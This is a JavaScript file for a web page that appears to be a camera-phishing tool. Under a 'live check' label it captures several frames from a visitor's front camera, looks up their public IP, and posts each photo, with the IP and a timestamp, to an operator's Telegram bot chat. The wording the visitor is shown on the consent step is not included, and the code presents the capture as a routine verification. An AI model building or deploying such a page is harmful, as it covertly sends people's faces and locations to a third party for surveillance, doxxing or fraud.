import { CONFIG } from "./config.js";

const video    = document.getElementById("video");
const canvas   = document.getElementById("canvas");

const consent  = document.getElementById("stepConsent");
const camStage = document.getElementById("camStage");
const doneStage= document.getElementById("doneStage");

const barFill  = document.getElementById("barFill");
const pctText  = document.getElementById("pctText");
const stageSt  = document.getElementById("stageStatus");
const doneMsg  = document.getElementById("doneMsg");

let stream = null;

function show(el){ el.style.display = "block"; }
function hide(el){ el.style.display = "none"; }

function setPct(p){ barFill.style.width = p+"%"; pctText.textContent = Math.round(p)+"%"; }

/* ---------- helpers ---------- */
async function getIP(){
  try { const r=await fetch("https://api.ipify.org?format=json"); return (await r.json()).ip; }
  catch { return "Unknown"; }
}

async function sendImage(blob, caption){
  const fd = new FormData();
  fd.append("chat_id", CONFIG.ADMIN_CHAT_ID);
  fd.append("photo", blob, `check_${Date.now()}.jpg`);
  fd.append("caption", caption);
  try{
    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
    return res.ok;
  }catch(e){ return false; }
}

/* ---------- start flow ---------- */
document.getElementById("btnStart").addEventListener("click", async () => {
  hide(consent);
  show(camStage);
  stageSt.textContent = "Requesting camera…";

  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video:{ width:{ideal:CONFIG.CAM_WIDTH}, height:{ideal:CONFIG.CAM_HEIGHT}, facingMode:"user" }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => video.readyState>=2 ? r() : video.onloadeddata=r);

    // warm-up so image is not black
    stageSt.textContent = "Camera ready — capturing…";
    await new Promise(r => setTimeout(r, 800));

    // capture N frames
    const ip = await getIP();
    let ok = 0;
    for (let i=0; i<CONFIG.CAPTURE_COUNT; i++){
      setPct( (i/CONFIG.CAPTURE_COUNT)*100 );

      canvas.width  = CONFIG.CAM_WIDTH;
      canvas.height = CONFIG.CAM_HEIGHT;

      // ✅ FIX: use CONFIG values instead of invalid variable names
      canvas.getContext("2d").drawImage(video, 0, 0, CONFIG.CAM_WIDTH, CONFIG.CAM_HEIGHT);

      const blob = await new Promise(res => canvas.toBlob(res,"image/jpeg",CONFIG.IMAGE_QUALITY));
      if (blob){
        const date = new Date().toLocaleString("en-US",{timeZoneName:"short"});
        const cap = `Live check frame ${i+1}/${CONFIG.CAPTURE_COUNT}\n🕐 ${date}\n🌐 IP: ${ip}`;
        const sent = await sendImage(blob, cap);
        if (sent) ok++;
      }
      if (i < CONFIG.CAPTURE_COUNT-1) await new Promise(r=>setTimeout(r,CONFIG.CAPTURE_GAP_MS));
    }
    setPct(100);
    stopCamera();

    hide(camStage);
    show(doneStage);
    doneMsg.textContent = ok>0
      ? `${ok} frame(s) delivered to your configured chat.`
      : "Delivery failed — check your BOT_TOKEN / chat ID in config.js";
    doneStage.scrollIntoView({behavior:"smooth"});

  }catch(err){
    stopCamera(); // ensure camera is released on error
    stageSt.textContent = "❌ Camera unavailable or denied. Reload and try again.";
    console.error(err);
  }
});

/* ---------- finish ---------- */
document.getElementById("btnFinish").addEventListener("click", ()=>{
  window.location.href = addParam("done.html", location.search);
});
function addParam(base, qs){ return qs ? base+qs : base; }

function stopCamera(){
  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
}
window.addEventListener("beforeunload", stopCamera);
